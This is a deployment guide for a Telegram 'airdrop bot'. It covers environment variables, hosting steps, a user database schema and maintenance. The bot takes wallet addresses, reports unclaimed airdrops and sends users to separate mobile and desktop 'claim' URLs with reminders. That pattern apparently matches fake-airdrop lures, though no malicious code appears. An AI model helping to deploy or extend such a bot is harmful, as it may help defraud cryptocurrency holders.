# Complete Deployment Guide

## Environment Variables Setup

### Required Variables
```
BOT_TOKEN=your_telegram_bot_token
DATABASE_URL=postgresql://user:pass@host:port/db
INFURA_PROJECT_ID=your_infura_api_key
CLAIM_URL=https://your-mobile-claim-interface.com
WIN_MAC_URL=https://your-desktop-claim-interface.com
ADMIN_USER_ID=your_telegram_user_id
```

### Optional Variables
```
NOTIFICATION_BOT_TOKEN=admin_notification_bot_token
NOTIFICATION_CHAT_ID=admin_chat_id_for_notifications
NODE_ENV=production
```

## Platform-Specific Instructions

### Render Deployment

1. **Repository Setup**
   - Push code to GitHub repository
   - Connect repository to Render dashboard

2. **Service Configuration**
   - Service Type: Web Service
   - Build Command: `npm install`
   - Start Command: `npm start`
   - Auto-Deploy: Enable

3. **Environment Variables**
   - Add all required variables in Render dashboard
   - Ensure PostgreSQL addon is attached

4. **Conflict Resolution**
   - Use production bot file for robust error handling
   - Monitor startup logs for 409 conflicts

### Replit Deployment

1. **Project Import**
   - Import from GitHub or upload files directly
   - Configure Secrets tab with environment variables

2. **Database Setup**
   - Use built-in PostgreSQL database
   - DATABASE_URL automatically provided

3. **Workflow Configuration**
   - Main file: `bot.js`
   - Start command: `node bot.js`
   - Port: 8000 (for health checks)

### VPS/Server Deployment

1. **Prerequisites**
   - Node.js 18+ installed
   - PostgreSQL database running
   - PM2 for process management

2. **Installation Steps**
   ```bash
   git clone your-repository
   cd telegram-airdrop-bot
   npm install
   cp .env.example .env
   # Edit .env with your values
   ```

3. **Process Management**
   ```bash
   pm2 start bot.js --name "airdrop-bot"
   pm2 startup
   pm2 save
   ```

## Database Setup

### Automatic Initialization
The bot automatically creates required tables on first run:
- Users table with profile data
- Enhanced columns for reminder system
- Performance indexes for queries

### Manual Database Setup (if needed)
```sql
CREATE TABLE users (
    id BIGINT PRIMARY KEY,
    username VARCHAR(255),
    first_name VARCHAR(255),
    last_name VARCHAR(255),
    is_active BOOLEAN DEFAULT true,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_wallet_address VARCHAR(255),
    pending_airdrop_amount DECIMAL(15,2),
    pending_airdrop_projects TEXT,
    pending_airdrop_claim_url TEXT,
    last_analysis_date TIMESTAMP,
    has_unclaimed_airdrops BOOLEAN DEFAULT false
);

CREATE INDEX idx_users_active ON users(is_active);
CREATE INDEX idx_users_unclaimed ON users(has_unclaimed_airdrops);
CREATE INDEX idx_users_last_analysis ON users(last_analysis_date);
```

## API Keys Setup

### Telegram Bot Token
1. Message @BotFather on Telegram
2. Send `/newbot` command
3. Follow prompts to create bot
4. Copy provided token to `BOT_TOKEN`

### Infura API Key
1. Register at infura.io
2. Create new project
3. Select Web3 API
4. Copy Project ID to `INFURA_PROJECT_ID`

### Notification Bot (Optional)
1. Create separate bot for admin notifications
2. Add bot to admin chat
3. Get chat ID using bot API
4. Configure `NOTIFICATION_BOT_TOKEN` and `NOTIFICATION_CHAT_ID`

## Testing Deployment

### Health Check
- Bot responds to `/start` command
- Wallet analysis functions correctly
- Database operations succeed
- No 409 conflict errors

### Feature Testing
1. Send wallet address for analysis
2. Verify airdrop detection works
3. Test device selection flow
4. Confirm admin notifications arrive
5. Check reminder system operates

## Monitoring and Maintenance

### Log Monitoring
- Database connection status
- API request success rates
- User interaction metrics
- Error frequency and types

### Performance Optimization
- Monitor response times
- Database query performance
- API rate limit usage
- Memory consumption

### Regular Maintenance
- Update dependencies monthly
- Monitor API quota usage
- Review error logs weekly
- Database backup verification

## Troubleshooting

### Common Issues
- **409 Conflict**: Multiple bot instances running
- **Database Connection**: Check connection string format
- **API Limits**: Monitor Infura request quotas
- **Memory Issues**: Restart service if needed

### Support Resources
- Check application logs first
- Verify environment variables
- Test database connectivity
- Monitor external API status

## Security Best Practices

### Environment Security
- Never commit `.env` files
- Use platform-specific secret management
- Rotate API keys regularly
- Monitor access logs

### Bot Security
- Validate all user inputs
- Implement rate limiting
- Log security events
- Monitor for abuse patterns